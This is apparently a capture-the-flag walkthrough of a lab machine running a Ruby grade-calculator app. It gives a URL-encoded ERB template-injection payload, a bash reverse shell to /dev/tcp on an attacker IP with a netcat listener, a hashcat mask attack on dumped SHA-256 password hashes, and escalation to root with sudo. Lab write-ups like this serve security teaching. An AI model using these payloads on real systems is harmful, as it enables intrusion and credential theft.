To find the version of OpenSSH I run `nmap` and find the version is 8.9p1.

```
nmap -sC -sV {victim ip}
```

To find the programming language the web-app was built with I run:

```
curl -I {victim ip}
```
I get the following response and find the language is Ruby:

```
HTTP/1.1 200 OK Server: nginx Date: Tue, 25 Jun 2024 17:23:04 GMT Content-Type: text/html;charset=utf-8 Connection: close X-Xss-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07) Content-Length: 3842
```

When we visit the page I find this is a web-app that it runs a weighted grade calculator, on the directory `/weighted-grade`.   

Seeing there is "Category" section that allows for alphanumeric user input, there is the potential for a Server Side Template Injection vulnerability in Embedded Ruby.

If we use Burp to catch our input when we fill out the forms in `weighted-grade`, then send it to the `Responder` to edit the input. Under `category1`
I edited this input,(1) is the actual string, (2) is the string url-encoded ruby input.

```
(1)=test
<%= IO.popen("sleep 10").readlines() %>
(2)= test%0A<%25%3d+IO.popen("id").readlines()%25>
```

The output should be the output of the `id` command. This will confirm that the Server Side Template Vulnerability exists.

Now I update the injection to call a local `netcat` listener

```
Test1%0A<%25%3d+IO.popen("bash+-c+'bash+-
i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'").readlines()+%25>
```

Then run the netcat listener, locally, and trigger burp to send the POST:

```
nc -lnvp 4444
```

This will give me the shell of the web-app on my local listener.

Our next goal is to get root on the web-server. Running `id` we find the user is `susan`. On `susan's` home directory I find a `Migration/` directory with a file `pupilpath_credentials.db` 

I open the file,

```
$ sqlite3 pupilpath_credentials.db
sqlite > select * from users;

1|Susan
Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry
Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David
Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen
Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

We know from the letter `susan` in the directory `/var/mail` that the password format is "firstname_firstname backwards_randomly generated int from 1 to 1,000,000,000". 

To crack the password we put the hash found in the database in hash.txt and put the string "susan_nasus_" in the file wl. Then we run the following command:

```
hashcat -m 1400 -a 6 hash.txt wl ?d?d?d?d?d?d?d?d?d -O
```

The flags mean the following:

```
-m 1400: Specifies the hash type, in this case, SHA-256.

-a 6 : Specifies the attack mode, in this case, a combinator attack where each candidate in the keyspace is appended to each word in the wordlist.

hash : The file containing the hash to be cracked.  
wl : The wordlist file containing the prefix susan_nasus_ .

?d?d?d?d?d?d?d?d?d: The mask representing all combinations of 9 digits. -O : Optimized kernel (useful for speed but may have restrictions).
```

We get the password: `susan_nasus_413759210`

We run the command `sudo -i` and input the password which gives us root. Then we run `cat /root/root.txt`

